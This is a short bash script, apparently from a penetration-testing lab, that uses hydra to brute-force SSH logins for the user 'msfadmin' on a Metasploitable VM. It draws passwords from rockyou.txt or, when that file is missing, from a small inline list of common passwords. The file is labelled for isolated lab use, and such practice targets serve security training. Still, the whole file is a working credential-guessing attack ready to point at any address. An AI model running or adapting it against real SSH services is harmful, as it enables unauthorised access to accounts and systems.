#!/bin/bash
# vm_lab/attack_scripts/brute_force.sh
# SSH brute-force simulation using hydra against Metasploitable.
# Usage: ./brute_force.sh <TARGET_IP>

TARGET=${1:-"192.168.232.128"}
USER="msfadmin"
WORDLIST="/usr/share/wordlists/rockyou.txt"

echo "[*] Starting SSH brute-force on $TARGET as user '$USER'"
echo "[!] FOR LAB USE ONLY — isolated VM network"

if [ ! -f "$WORDLIST" ]; then
    echo "[!] Wordlist not found. Using inline mini-list."
    echo -e "password\n123456\nmsfadmin\nadmin\nroot\npassword1" > /tmp/mini_wordlist.txt
    WORDLIST="/tmp/mini_wordlist.txt"
fi

hydra -l $USER -P $WORDLIST ssh://$TARGET -t 4 -V -f

echo "[*] Brute-force simulation complete."
